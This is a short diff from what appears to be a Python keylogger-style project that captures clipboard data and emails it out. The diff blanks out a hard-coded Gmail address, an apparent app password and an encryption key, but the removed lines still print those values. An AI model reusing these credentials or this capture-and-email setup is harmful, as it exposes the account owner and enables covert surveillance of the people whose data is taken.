@@ -47,11 +47,11 @@ clipboard_information_e= "e_clipboard.txt"
 time_iteration=15
 number_of_iterations_end= 3
 
-email_address = "sonambewafahai2000@gmail.com"
-password = "jtpn neyh cmyp gjqn"
-toaddr = "sonambewafahai2000@gmail.com"
+email_address = ""
+password = ""
+toaddr = ""
 
-key = "MgJTVRusmy4CGxkImEzRGDMp29qi7PYuWcpxjXV5Itg="
+key = ""
 
 file_path = "C:\\Users\\saikr\\PycharmProjects\\Python Project\\project"
 extend = "\\"
